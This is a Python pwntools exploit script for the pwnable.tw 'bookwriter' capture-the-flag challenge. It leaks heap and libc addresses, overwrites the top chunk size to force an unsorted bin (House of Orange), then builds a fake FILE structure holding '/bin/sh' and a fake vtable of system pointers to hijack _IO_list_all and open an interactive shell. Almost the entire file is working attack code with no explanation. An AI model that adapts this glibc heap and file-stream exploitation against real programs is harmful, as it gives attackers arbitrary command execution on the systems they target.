from pwn import *
BEDUG = True

libc = ELF('./libc_64.so.6')
if BEDUG == True:
    io = process('./bookwriter_patched', env={"LD_PRELOAD":"./libc_64.so.6"})
    gdb.attach(io)
else:
    io = remote('chall.pwnable.tw', 10304)

def add(size, content):
    io.sendlineafter(b'Your choice :', b'1')
    if size == 24:
        io.sendlineafter(b'Size of page :', str(size).encode('utf-8'))
    else:
        io.sendlineafter(b'Size of page :', str(size-0x10).encode('utf-8'))
    io.sendafter(b'Content :', content)

def view(index):
    io.sendlineafter(b'Your choice :', b'2')
    io.sendlineafter(b'Index of page :', str(index).encode('utf-8'))

def edit(index, content):
    io.sendlineafter(b'Your choice :', b'3')
    io.sendlineafter(b'Index of page :', str(index).encode('utf-8'))
    io.sendafter(b'Content:', content)

def change_author(new_name):
    io.sendlineafter(b'Your choice :', b'4')
    #print(io.recvuntil(b'Do you want to change the author ? (yes:1 / no:0) '))
    #io.sendline(b'1')
    #print(io.recvuntil(b'Author :'))
    #io.send(new_name)


def leak():
    io.sendlineafter(b'Your choice :', b'4')
    io.recvuntil(b'Author : ')
    io.recv(0x40)
    leak = u64(io.recv(4)+b'\0\0\0\0')
    io.sendlineafter(b'Do you want to change the author ? (yes:1 / no:0) ', b'0')
    return leak


io.recvuntil(b'Author :')
author = b'A'*0x40
io.send(author)
io.sendlineafter(b'Your choice :', b'4')
io.sendlineafter(b'Do you want to change the author ? (yes:1 / no:0) ', b'0')
add(0x30, b'A') #0
heapbase = leak() - 0x1020
log.info('Heap: '+hex(heapbase))
add(24, b'A') #1
edit(1, b'A'*24)
edit(1, b'A'*24+b'\xa1\x0f\0')
pause()
add(0x1000, b'A') #2 trigger syscall to make a unsortedbin
add(0x30, b'A') #3
add(0x30, b'A') #4 leak main arena - libc
view(4)
io.recvuntil(b'Content :\n')
libc.address = u64(io.recv(6)+b'\0\0') - 0x3c3b41
log.info('Libc: '+hex(libc.address))
add(0x30, b'A') #5
add(0x30, b'A') #6
add(0x30, b'A') #7
edit(0, b'\0') # edit to perform index overflow
add(0x30, b'A') #8 index overflow

chunk = heapbase + 0x1180

'''

# craft fake stream

# satisfy condition:
# fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base

fake_stream = b'/bin//sh'
fake_stream += p64(0) # _IO_read_ptr
fake_stream += p64(0) # _IO_read_end
fake_stream += p64(0) # _IO_read_base
fake_stream += p64(0) # _IO_write_base
fake_stream += p64(0x1000) # _IO_write_ptr
fake_stream += p64(0) # _IO_write_end
fake_stream += p64(0) # _IO_buf_base
fake_stream += p64(0) # _IO_buf_end
fake_stream += p64(0) # _IO_save_base
fake_stream += p64(0) # _IO_backup_base
fake_stream += p64(0) # _IO_save_end
fake_stream += p64(0) # markers
fake_stream += p64(0) # _chain ptr
fake_stream += p64(3) # nice
fake_stream += p64(0xffffffffffffffff)
fake_stream += p64(0)
fake_stream += p64(0)
fake_stream += p64(0xffffffffffffffff)
fake_stream += p64(0)*8
vtable_addr = chunk + len(fake_stream) + 0x8
fake_stream += p64(vtable_addr)

#

# craft vtable jump

fake_vtable = p64(0)
fake_vtable += p64(0)
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_finish'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_overflow'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_underflow'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_default_uflow'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_default_pbackfail'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_xsputn'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_xsgetn'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_seekoff'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_default_seekpos'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_setbuf'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_sync'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_doallocate'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_read'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_write'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_seek'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_close'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['__GI__IO_file_stat'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_default_showmanyc'])
fake_vtable += p64(libc.sym['system']) # p64(libc.sym['_IO_default_imbue'])
fake_vtable += p64(0) * 3
'''

payload = b'\0'*0x28+p64(0x21)+b'A'*0x18+(p64(0x31)+b'\0'*0x28)*5+p64(0x31)+b'\0'*0x20
#fake stream
fs=b'/bin/sh\0'
fs+=p64(0x61)
fs+=p64(0)
fs+=p64(libc.sym['_IO_list_all']-0x10)
fs+=p64(0)
fs+=p64(0x1000)
fs+=p64(0)
fs+=p64(0)
fs+=p64(0)
fs+=p64(0)
fs+=p64(0)
fs+=p64(0)
fs+=p64(0)
fs+=p64(chunk)
fs+=p64(3)
fs+=p64(0xffffffffffffffff)
fs+=p64(0)
fs+=p64(0)
fs+=p64(0xffffffffffffffff)
fs+=p64(0)*8
vtable_addr = chunk + len(fs) + 0x8
fs += p64(vtable_addr)
payload+=fs
#fake vtable
fvtable = p64(0)
fvtable += p64(0)
fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_finish'])
fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_overflow'])
fvtable += p64(libc.sym['system']) # p64(libc.sym['_IO_new_file_underflow'])
payload+=fvtable

edit(0, payload)
io.sendlineafter(b'Your choice :', b'1')
io.sendlineafter(b'Size of page :', b'48')
io.interactive()
